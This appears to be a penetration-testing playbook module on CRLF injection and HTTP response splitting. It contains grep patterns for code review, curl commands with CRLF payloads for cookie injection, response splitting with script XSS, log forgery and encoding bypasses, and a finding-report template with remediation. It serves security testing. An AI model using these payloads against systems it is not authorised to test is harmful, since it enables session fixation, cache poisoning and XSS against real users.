# VULN MODULE — CRLF Injection / HTTP Response Splitting
# Asset: webapp
# CWE-113 | Report prefix: WEB-CRLF

## THREAT MODEL

CRLF injection (Carriage Return `\r` + Line Feed `\n`) exploits the HTTP/1.1
protocol's reliance on CR LF (`\r\n`) as a header delimiter. When user-supplied
input reaches an HTTP response header without CR/LF stripping, an attacker can
inject arbitrary headers or split the response into two distinct HTTP messages.

Primary injection sinks:
- Redirect Location headers built from user-controlled URL parameters
- Set-Cookie headers built from user-controlled values
- Custom headers that echo user input (X-Custom-Header, Content-Disposition)
- Log files that write request data without sanitization
- Server-side redirects in framework routing

Attack consequences:
- HTTP response splitting → inject entire second HTTP response → cache poisoning, XSS
- Set-Cookie injection → session fixation, cookie manipulation
- Header injection → bypass security headers, inject CSP, X-Frame-Options
- Log injection → forge log entries, evade audit trails
- XSS via injected Content-Type or script in split response body

## VULNERABILITY CLASSES

1. HTTP Response Splitting               CWE-113  — injected CRLF splits HTTP response
2. Log Injection                         CWE-117  — CRLF injects false log entries
3. Header Injection via Redirect         CWE-113  — Location: header built from user input
4. Set-Cookie Injection                  CWE-113  — cookie value/name contains CRLF
5. Content-Type / X-Powered-By Poisoning CWE-113  — response headers overridden via injection
6. XSS via Response Splitting            CWE-79   — injected second response body contains script
7. Session Fixation via Set-Cookie       CWE-384  — attacker-chosen session ID injected via CRLF
8. CRLF in Forwarded Logs               CWE-117  — access logs manipulated via injected CRLF

## WHITEBOX STATIC ANALYSIS

```bash
# ── Header setting with user input ────────────────────────────────────────────
# Python (Flask / Django)
grep -rn "make_response\|response\[.\|headers\[.\|set_cookie\|redirect(" \
  --include="*.py" -A5
# Flag any line where request.args / request.form / request.headers reaches header value

grep -rn "request\.args\|request\.form\|request\.GET\|request\.POST" \
  --include="*.py" -A3 | grep -iE "header|redirect|location|cookie|set_cookie"

# Node.js (Express)
grep -rn "res\.set(\|res\.setHeader(\|res\.header(\|res\.cookie(\|res\.redirect(" \
  --include="*.js" --include="*.ts" -A5
grep -rn "req\.query\|req\.params\|req\.body\|req\.headers" \
  --include="*.js" --include="*.ts" -A3 | grep -iE "setHeader|redirect|location|cookie"

# Java (Servlet / Spring)
grep -rn "response\.setHeader\|response\.addHeader\|response\.sendRedirect\|addCookie" \
  --include="*.java" -A5
grep -rn "request\.getParameter\|request\.getHeader\|getQueryString" \
  --include="*.java" -A3 | grep -iE "setHeader|addHeader|sendRedirect|addCookie"

# PHP
grep -rn "header(\|setcookie(\|header_remove(" --include="*.php" -A3
grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_SERVER" --include="*.php" -A3 | \
  grep -i "header("
# Classic: header("Location: " . $_GET['url']); → CRLF + open redirect

# Ruby on Rails
grep -rn "response\.headers\[.\|redirect_to\|cookies\[.\|send_file" \
  --include="*.rb" -A5
grep -rn "params\[" --include="*.rb" -A3 | grep -iE "headers|redirect|cookie"

# ── CRLF sanitization (check for missing defenses) ────────────────────────────
grep -rn "strip\|sanitize\|encode\|escape\|replace.*\\\\r\\\\n\|replace.*\\\\n" \
  --include="*.py" --include="*.rb" --include="*.php" \
  --include="*.js" --include="*.ts" --include="*.java"
# If NOT found near header-setting code → no CRLF stripping

# ── Log writing with user input ───────────────────────────────────────────────
grep -rn "logger\.\|log\.\|logging\.\|console\.log\|access_log\|error_log" \
  --include="*.py" --include="*.js" --include="*.ts" \
  --include="*.java" --include="*.php" --include="*.rb" -A3 | \
  grep -iE "request|header|user|input|param"
# Logging raw request headers / user input without newline stripping → log injection

# ── Redirect URL construction from user input ─────────────────────────────────
grep -rn "next=\|return_to=\|redirect=\|url=\|continue=" \
  --include="*.py" --include="*.rb" --include="*.php" \
  --include="*.js" --include="*.ts" -A5 | \
  grep -iE "redirect|location|header"
# redirect_to(params[:next]) in Rails → CRLF + open redirect chain
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Detect CRLF injection in redirect parameters

```bash
TARGET="https://target.com"

# URL-encoded CRLF sequences to test:
# %0d%0a  → \r\n  (standard)
# %0a     → \n    (LF only — some servers split on LF alone)
# %0d     → \r    (CR only — rare)
# %E5%98%8A%E5%98%8D → UTF-8 encoded \r\n (Unicode bypass)

# Inject Set-Cookie header via redirect parameter:
curl -skI "$TARGET/login?next=/%0d%0aSet-Cookie:%20injected=crlf" | \
  grep -iE "set-cookie|location|injected"

# Inject via redirect_uri or return URL:
curl -skI "$TARGET/oauth/callback?redirect_uri=https://target.com/%0d%0aSet-Cookie:%20malicious=1"

# Test LF-only:
curl -skI "$TARGET/redirect?url=https://target.com%0aSet-Cookie:%20injected=lf"

# Test URL path injection:
curl -skI "$TARGET/%0d%0aX-Injected:%20yes"
```

### Step 2 — Test common parameter names

```bash
# Enumerate redirect/URL parameters for CRLF
PARAMS="next return_to redirect url goto dest destination back callback redir"
PAYLOAD="%0d%0aX-CRLF-Test:%20injected"

for param in $PARAMS; do
  response=$(curl -skI "$TARGET/login?$param=https://target.com/$PAYLOAD")
  if echo "$response" | grep -qi "x-crlf-test"; then
    echo "[VULN] Parameter: $param"
    echo "$response" | grep -iE "x-crlf|location"
  fi
done
```

### Step 3 — Set-Cookie injection

```bash
# Inject malicious cookie via CRLF in session endpoint
curl -skI "$TARGET/set-lang?lang=en%0d%0aSet-Cookie:%20session=attacker_session_id;%20HttpOnly" | \
  grep -i "set-cookie"

# Test cookie name injection:
curl -skI "$TARGET/api/track?id=test%0d%0aSet-Cookie:%20admin=true" | \
  grep -i "set-cookie"
```

### Step 4 — XSS via response splitting (HTTP/1.1)

```bash
# Inject a complete second HTTP response containing script
PAYLOAD="%0d%0a%0d%0a<script>alert(document.domain)</script>"
curl -skI "$TARGET/redirect?url=https://target.com$PAYLOAD"
# If response body (after injected blank line) contains the script → response splitting
```

### Step 5 — Log injection detection

```bash
# Inject fake log entry into request path or User-Agent
curl -sk "$TARGET/api/search?q=test%0d%0a127.0.0.1%20-%20admin%20[01/Jan/2024]%20GET%20/admin%20200" \
  -H "User-Agent: Mozilla/5.0%0d%0aFakeLogEntry:%20injected"

# Inject via X-Forwarded-For (often logged verbatim):
curl -sk "$TARGET/" -H "X-Forwarded-For: 1.2.3.4%0d%0aFAKE LOG ENTRY: admin login success"
# If server logs contain forged entry → log injection confirmed
```

### Step 6 — Bypass attempts (encoded variants)

```bash
# Double URL encoding
curl -skI "$TARGET/redirect?url=https://target.com%250d%250aX-Test:%20encoded"

# UTF-8 multi-byte CRLF
curl -skI "$TARGET/redirect?url=https://target.com%E5%98%8A%E5%98%8DX-Test:%20utf8"

# Mixed case + encoding
curl -skI "$TARGET/redirect?url=https://target.com%0AX-Test:%20lf-only"
```

## DYNAMIC CONFIRMATION

### Confirming Header Injection via Set-Cookie

```bash
# 1. Send injected request:
curl -skI "https://target.com/login?next=/%0d%0aSet-Cookie:%20confirmed_crlf=true;%20Path=/" \
  -H "Cookie: session=VALID_SESSION"

# 2. Confirm the injected header appears in the HTTP response:
# Expected response headers:
#   Location: /
#   Set-Cookie: confirmed_crlf=true; Path=/
#   [normal headers follow]

# 3. Verify injected cookie is set in browser:
# Open DevTools → Application → Cookies → confirm confirmed_crlf=true present
```

### Confirming XSS via Response Splitting

```bash
# Full response splitting payload (inject blank line + HTML body):
PAYLOAD='%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>'

curl -skI "https://target.com/redirect?url=$PAYLOAD" -v 2>&1 | head -60
# If the raw response contains a second HTTP response block → confirmed
```

## REPORT_BUNDLE FIELDS

```json
{
  "id": "WEB-CRLF-001",
  "title": "CRLF Injection in [parameter] allows arbitrary HTTP header injection",
  "cwe": 113,
  "severity": "Medium",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
  "cvss_score": 6.1,
  "endpoint": "GET https://target.com/redirect?url=INJECT",
  "method": "GET",
  "parameter": "url",
  "payload": "%0d%0aSet-Cookie:%20injected=crlf;%20Path=/",
  "evidence": {
    "request": "GET /redirect?url=/%0d%0aSet-Cookie:%20injected=crlf HTTP/1.1",
    "response_snippet": "Location: /\\r\\nSet-Cookie: injected=crlf\\r\\n",
    "injected_header_confirmed": true
  },
  "impact": "Attacker can inject arbitrary HTTP response headers. Chained with response splitting: XSS, session fixation, cache poisoning. Standalone: cookie injection bypassing HttpOnly assumptions.",
  "remediation": "Strip or reject CR (\\r, %0d) and LF (\\n, %0a) characters from any user-supplied value before including it in a response header. Use framework-provided redirect helpers that enforce URL encoding."
}
```

## TRIAGE NOTE

CRLF injection confirmed but only injecting custom X-headers: Low / Medium
CRLF → Set-Cookie injection enabling session fixation: Medium / High
CRLF → full response splitting enabling XSS: High
CRLF in log files only (no response header impact): Low / Informative
Double-encoded CRLF only (requires decode by app): confirm decode chain before reporting
Modern frameworks (Express 4.x+, Rails 6+, Django 3+) strip CRLF in headers by default;
test explicitly and confirm framework version if whitebox data available.
